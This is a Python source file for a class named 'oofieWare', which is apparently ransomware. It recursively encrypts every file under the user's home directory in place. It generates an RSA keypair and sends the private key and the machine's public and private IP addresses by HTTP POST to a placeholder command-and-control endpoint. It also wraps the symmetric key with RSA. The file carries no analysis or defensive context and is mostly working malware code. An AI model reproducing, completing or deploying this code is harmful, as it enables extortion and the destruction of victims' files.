import os
import subprocess
import socket
import base64
import json
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class oofieWare:
    def __init__(self, gen_rsa=True):
        self.key = None
        self.enc_key = None
        self.encrypter = None
        self.decrypter = None
        self.startPoint = os.path.expanduser("~")
        self.PUBLIC_IP = requests.get('https://api.ipify.org').text
        self.PRIVATE_IP = socket.gethostbyname(socket.gethostname())
        
        self.ENDPOINT = "<command and control server>"

        if gen_rsa:
            self.privKey = None
            self.pubKey = None
        else:
            self.pubKey = '' # insert default val

    def startPt(self):
        return self.startPoint

    def gen_sym_key(self):
        secure_pw = os.urandom(32)
        salt = os.urandom(16)

        kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
             salt=salt,
             iterations=500000,
        )

        self.key = base64.urlsafe_b64encode(kdf.derive(secure_pw))
        self.encrypter = Fernet(self.key)

    def gen_rsa_keypair(self):
        keyPair = RSA.generate(4096)
        self.privKey = keyPair.export_key()
        self.pubKey = keyPair.publickey()
        requests.post(self.ENDPOINT, data=json.dumps({
            "PUBLIC_IP": self.PUBLIC_IP,
            "PRIVATE_IP": self.PRIVATE_IP,
            "PRIVATE_KEY": self.privKey
        }), headers={"Content-Type" : "application/json"})

    def crypt_file(self, file_path):
        if self.encrypter:
            with open(file_path, 'rb') as x:
                data = x.read()
                enc_data = self.encrypter.encrypt(data)
                x.close()

            with open(file_path, "wb") as y:
                y.write(enc_data)
                y.close()

        if self.decrypter:
            with open(file_path, 'rb') as x:
                data = x.read()
                dec_data = self.decrypter.decrypt(data)
                x.close()

            with open(file_path, "wb") as y:
                y.write(dec_data)
                y.close()

    def crypt_system(self):
        for root, dirs, files in os.walk(self.startPoint):
            for file in files:
                file_path = os.path.join(root, file)
                self.crypt_file(file_path)
        self.encrypter = None

    def enc_key(self):
        enc_for_key = PKCS1_OAEP.new(self.pubKey)
        self.enc_key = enc_for_key.encrypt(self.key)
        self.key = None

    



# print(oofieWare().startPt())
